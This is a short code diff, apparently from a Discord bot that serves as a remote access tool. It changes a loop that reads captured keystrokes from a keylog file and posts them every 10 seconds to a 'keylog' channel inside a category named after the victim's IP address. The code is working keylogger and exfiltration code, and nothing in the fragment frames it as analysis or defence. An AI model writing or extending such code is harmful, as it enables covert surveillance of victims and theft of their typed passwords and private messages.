@@ -422,7 +422,7 @@ async def on_ready():
                     if channel:
                         await channel.send(embed=embed)
 
-    @tasks.loop(seconds=UPDATE_INTERVAL)
+    @tasks.loop(seconds=10)
     async def update_keylog():
         category = nextcord.utils.get(guild.categories, name=str(ip))
         
@@ -431,6 +431,8 @@ async def on_ready():
             keylog.close()
         channel = nextcord.utils.get(category.text_channels, name="keylog")
         await channel.purge()
+        if log == "":
+            log = "No keys pressed."
         await channel.send(log)
         
 
